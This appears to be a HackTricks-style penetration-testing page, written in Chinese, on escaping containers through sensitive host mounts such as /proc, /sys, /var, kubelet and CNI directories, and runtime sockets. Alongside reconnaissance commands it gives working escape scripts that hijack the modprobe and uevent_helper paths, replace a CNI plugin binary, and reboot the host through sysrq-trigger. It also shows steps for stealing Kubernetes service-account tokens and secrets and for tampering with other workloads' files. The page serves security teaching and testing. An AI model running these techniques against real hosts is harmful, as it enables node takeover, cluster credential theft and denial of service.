# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## 概述

Host mounts 是最重要的实际 container-escape 面之一，因为它们常常会把一个精心隔离的进程视图重新压缩成对 host 资源的直接可见性。危险情况并不只限于 `/`。对 `/proc`、`/sys`、`/var`、runtime sockets、kubelet-managed state，或与设备相关路径的 bind mounts，可能暴露 kernel 控制、credentials、相邻 container 的 filesystem，以及 runtime 管理接口。

这个页面独立存在于各个单独的 protection 页面之外，是因为 abuse model 是横向交叉的。可写的 host mount 之所以危险，部分原因在于 mount namespaces，部分原因在于 user namespaces，部分原因在于 AppArmor 或 SELinux 覆盖，部分原因则在于具体暴露了哪个 host path。把它作为一个独立主题，会让攻击面更容易推理。

## `/proc` Exposure

procfs 同时包含普通的 process 信息和高影响力的 kernel control interfaces。因此，像 `-v /proc:/host/proc` 这样的 bind mount，或者暴露了意外可写 proc 条目的 container 视图，都可能导致 information disclosure、denial of service，或直接的 host code execution。

高价值的 procfs 路径包括：

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

先检查哪些高价值的 procfs 条目是可见或可写的：
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
这些路径之所以有趣，原因各不相同。`core_pattern`、`modprobe` 和 `binfmt_misc` 在可写时都可能变成 host code-execution 路径。`kallsyms`、`kmsg`、`kcore` 和 `config.gz` 是进行 kernel exploitation 时很强的 reconnaissance 来源。`sched_debug` 和 `mountinfo` 会泄露 process、cgroup 和 filesystem 上下文，这些信息有助于从 container 内部重建 host 布局。

每个路径的实用价值都不同，把它们都当成同样的影响会让 triage 更困难：

- `/proc/sys/kernel/core_pattern`
如果可写，这是影响最高的 procfs 路径之一，因为 kernel 会在 crash 后执行一个 pipe handler。一个能够把 `core_pattern` 指向存放在其 overlay 或挂载的 host path 中 payload 的 container，通常可以获得 host code execution。另请参见 [read-only-paths.md](protections/read-only-paths.md) 中的专门示例。
- `/proc/sys/kernel/modprobe`
这个路径控制 kernel 在需要调用 module-loading 逻辑时使用的 userspace helper。如果 container 可写且在 host context 中被解释，它就可能成为另一种 host code-execution 原语。与触发 helper 路径的方法结合时尤其有趣。
- `/proc/sys/vm/panic_on_oom`
这通常不是一个干净的 escape 原语，但它可以把 memory pressure 转化为 host-wide denial of service，因为它会把 OOM 条件变成 kernel panic 行为。
- `/proc/sys/fs/binfmt_misc`
如果 registration interface 可写，攻击者可以为选定的 magic value 注册一个 handler，并在执行匹配文件时获得 host-context execution。
- `/proc/config.gz`
用于 kernel exploit triage 很有价值。它可以帮助确定哪些 subsystem、mitigation 和可选 kernel feature 已启用，而不需要 host package metadata。
- `/proc/sysrq-trigger`
主要是 denial-of-service 路径，但非常严重。它可以立即 reboot、panic，或以其他方式扰乱 host。
- `/proc/kmsg`
会暴露 kernel ring buffer messages。可用于 host fingerprinting、crash analysis，并且在某些环境中还能泄露有助于 kernel exploitation 的信息。
- `/proc/kallsyms`
在可读时很有价值，因为它会暴露导出的 kernel symbol 信息，并且可能有助于在 kernel exploit 开发过程中绕过 address randomization 假设。
- `/proc/[pid]/mem`
这是一个直接的 process-memory 接口。如果目标 process 在必要的 ptrace-style 条件下可达，它可能允许读取或修改另一个 process 的 memory。实际影响在很大程度上取决于 credentials、`hidepid`、Yama 和 ptrace 限制，因此它是一个强大但有条件的路径。
- `/proc/kcore`
暴露系统 memory 的 core-image 风格视图。这个文件很大且不好用，但如果它能被有效读取，就说明 host memory surface 暴露得很糟糕。
- `/proc/kmem` 和 `/proc/mem`
历史上影响很高的 raw memory 接口。在许多现代系统上它们已被禁用或受到严格限制，但如果存在且可用，应被视为 critical finding。
- `/proc/sched_debug`
会泄露 scheduling 和 task 信息，即使其他 process 视图看起来比预期更干净，它也可能暴露 host process identity。
- `/proc/[pid]/mountinfo`
对于重建 container 在 host 上真正位于哪里、哪些 path 由 overlay 支撑，以及某个 writable mount 是否对应 host content 还是仅对应 container layer，非常有用。

如果 `/proc/[pid]/mountinfo` 或 overlay 细节可读，就用它们来恢复 container filesystem 的 host path：
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
这些命令很有用，因为许多 host-execution 技巧都需要将 container 内的路径转换为从 host 视角对应的路径。

### Full Example: `modprobe` Helper Path Abuse

如果 `/proc/sys/kernel/modprobe` 可以从 container 中写入，并且 helper path 会在 host 上下文中被解释，那么它就可以被重定向到攻击者控制的 payload：
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
确切的触发条件取决于目标和 kernel 行为，但重点是，可写的 helper path 可以将未来的 kernel helper 调用重定向到攻击者控制的 host-path 内容。

### Full Example: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

如果目标是评估可利用性而不是立即逃逸：
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
这些命令有助于回答是否可以看到有用的 symbol 信息、最近的 kernel messages 是否揭示了有趣的状态，以及哪些 kernel features 或 mitigations 被编译进去了。其影响通常不是直接 escape，但它可以显著缩短 kernel-vulnerability triage。

### Full Example: SysRq Host Reboot

如果 `/proc/sysrq-trigger` 可写并且可达 host view:
```bash
echo b > /proc/sysrq-trigger
```
效果是立即重启 host。这不是一个微妙的例子，但它清楚地表明，procfs exposure 可能比 information disclosure 严重得多。

## `/sys` Exposure

sysfs 暴露了大量 kernel 和 device 状态。一些 sysfs paths 主要用于 fingerprinting，而其他的则可能影响 helper execution、device behavior、security-module 配置或 firmware 状态。

高价值的 sysfs paths 包括：

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

这些 paths 之所以重要，原因各不相同。`/sys/class/thermal` 可以影响 thermal-management behavior，因此在暴露不当的环境中会影响 host stability。`/sys/kernel/vmcoreinfo` 可能泄露 crash-dump 和 kernel-layout 信息，这有助于进行低层级的 host fingerprinting。`/sys/kernel/security` 是 Linux Security Modules 使用的 `securityfs` interface，因此对它的意外访问可能暴露或修改 MAC 相关状态。EFI variable paths 可能影响 firmware-backed boot settings，因此比普通 configuration files 严重得多。`/sys/kernel/debug` 下的 `debugfs` 尤其危险，因为它本来就是面向开发者的 interface，安全预期远低于 hardened production-facing kernel APIs。

这些 paths 的有用 review commands 是：
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
这些 commands 有什么值得注意的地方：

- `/sys/kernel/security` 可能会泄露 AppArmor、SELinux，或者其他 LSM 的 surface 是否以一种本应只在 host 侧可见的方式暴露出来。
- `/sys/kernel/debug` 往往是这一组里最令人警惕的发现。如果 `debugfs` 已挂载且可读或可写，就要预期存在一个很大的、面向 kernel 的 surface，其具体风险取决于启用的 debug 节点。
- EFI variable 暴露不太常见，但如果存在，影响很大，因为它涉及的是 firmware-backed settings，而不是普通的 runtime files。
- `/sys/class/thermal` 主要与 host 稳定性和硬件交互相关，而不是用于 neat shell-style escape。
- `/sys/kernel/vmcoreinfo` 主要是 host-fingerprinting 和 crash-analysis 的来源，可用于理解底层 kernel 状态。

### Full Example: `uevent_helper`

如果 `/sys/kernel/uevent_helper` 可写，当触发 `uevent` 时，kernel 可能会执行一个由 attacker 控制的 helper：
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
原因在于 helper path 是从主机的角度来解释的。一旦被触发，helper 就会在 host context 中运行，而不是在当前 container 内运行。

## `/var` 暴露

将主机的 `/var` 挂载到 container 中通常会被低估，因为它看起来没有把 `/` 挂载进来那么夸张。实际上，这往往足以访问 runtime sockets、container snapshot directories、kubelet 管理的 pod volumes、projected service-account tokens，以及相邻应用的 filesystems。在现代节点上，`/var` 往往才是容器状态中最具运维价值的部分。

### Kubernetes Example

一个带有 `hostPath: /var` 的 pod 通常可以读取其他 pod 的 projected tokens 和 overlay snapshot content:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
这些命令很有用，因为它们可以回答该 mount 暴露的是仅仅平淡的应用数据，还是高影响力的 cluster credentials。一个可读的 service-account token 可能会立即把本地 code execution 变成 Kubernetes API access。

如果 token 存在，不要在发现 token 就停下：验证它能访问什么：
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
这里的影响可能远大于本地节点访问。一个具有广泛 RBAC 的 token 可以将挂载的 `/var` 变成对整个集群的 compromise。

### Docker And containerd Example

在 Docker 主机上，相关数据通常位于 `/var/lib/docker`，而在基于 containerd 的 Kubernetes 节点上，它可能位于 `/var/lib/containerd` 或特定 snapshotter 的路径下：
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
如果挂载的 `/var` 暴露了另一个 workload 的可写 snapshot 内容，攻击者可能能够修改 application 文件、植入 web content，或更改 startup scripts，而无需接触当前 container configuration。

一旦发现可写 snapshot 内容，可用于滥用的具体思路：
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
这些 commands 很有用，因为它们展示了挂载的 `/var` 的三大主要影响类别：application tampering、secret recovery，以及 lateral movement 到相邻 workloads。

## Kubelet State, Plugins, And CNI Paths

挂载 `/var/lib/kubelet`、`/opt/cni/bin` 或 `/etc/cni/net.d` 通常会通过 privileged DaemonSets、CNI agents、CSI node plugins、GPU operators 和 storage helpers 暴露出来。这些挂载很容易被当作“node plumbing”而忽略，但它们直接位于新 pods 的 execution path 上，并且经常包含 kubelet credentials、projected secrets、registration sockets 和可执行的 host-side plugin binaries。

高价值目标包括：

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Useful review commands are:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
这些路径为什么重要：

- `/var/lib/kubelet/pki` 可能会暴露 kubelet client certificates 和其他 node-local credentials，这些凭据有时可以根据 cluster design 重用于 API server 或 kubelet-facing TLS endpoints。
- `/var/lib/kubelet/pods` 通常包含同一节点上相邻 pods 的 projected service-account tokens 和 mounted Secrets。
- `/var/lib/kubelet/pod-resources/kubelet.sock` 主要是一个 reconnaissance surface，但非常有用：它会揭示当前哪些 pods 和 containers 拥有 GPUs、hugepages、SR-IOV devices，以及其他稀缺的 node-local resources。
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins`, 和 `/var/lib/kubelet/plugins_registry` 会暴露已安装的哪些 CSI、DRA 和 device plugins，以及 kubelet 预期要与哪些 sockets 通信。如果这些目录是 writable 而不只是 readable，那么这个发现就会严重得多。
- `/opt/cni/bin` 和 `/etc/cni/net.d` 直接位于 pod-network setup path 上。对这些位置的 writable access 往往不是单纯的 configuration exposure，而是一个延迟的 host-execution primitive。

### Full Example: Writable `/opt/cni/bin`

如果 host CNI binary directory 以 read-write 方式挂载，替换一个 plugin 就可能足以在 kubelet 下次在该节点创建 pod sandbox 时获得 host execution：
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
这不像挂载的 `docker.sock` 那么直接，但在已被攻陷的 Kubernetes 基础设施 pod 中，这通常更现实。重要的一点是，被修改的二进制文件之后会由主机网络 setup flow 执行，而不是由当前 container 执行。


## Runtime Sockets

敏感的 host mounts 往往包含 runtime sockets，而不是完整目录。它们非常重要，因此这里值得明确重复说明：
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
见 [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) 了解一旦挂载了这些 sockets 之后的完整利用流程。

作为一个快速的初始交互模式：
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
如果其中一个成功，从 "mounted socket" 到 "start a more privileged sibling container" 的路径通常比任何 kernel breakout 路径都短得多。

## Mount-Related CVEs

Host mounts 也会与 runtime 漏洞交叉。最近的重要例子包括：

- `CVE-2024-21626` in `runc`，其中泄露的目录文件描述符可能把 working directory 放到 host filesystem 上。
- `CVE-2024-23651`、`CVE-2024-23652` 和 `CVE-2024-23653` in BuildKit，其中恶意 Dockerfiles、frontends 和 `RUN --mount` 流程可能在 builds 期间重新引入 host 文件访问、删除或 elevated privileges。
- `CVE-2024-1753` in Buildah 和 Podman build flows，其中在 build 期间构造的 bind mounts 可能暴露可读写的 `/`。
- `CVE-2025-47290` in `containerd` 2.1.0，其中 image unpack 期间的 TOCTOU 可能让一个特制 image 在 pull 过程中修改 host filesystem。

这些 CVEs 在这里很重要，因为它们说明 mount 处理不只是 operator configuration 的问题。runtime 本身也可能引入基于 mount 的 escape 条件。

## Checks

使用这些命令快速定位最高价值的 mount 暴露：
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
这里值得注意的是：

- Host root、`/proc`、`/sys`、`/var` 和 runtime sockets 都是高优先级发现项。
- 可写的 proc/sys 条目通常意味着该挂载暴露的是 host-global kernel controls，而不是安全的 container 视图。
- 已挂载的 `/var` 路径值得检查 credentials 和相邻 workload，而不只是文件系统本身。
- Kubelet 状态目录和 CNI/plugin 路径应与 runtime sockets 一样优先处理，因为它们通常直接位于节点的 pod-creation 和 credential-distribution 路径上。

## References

- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
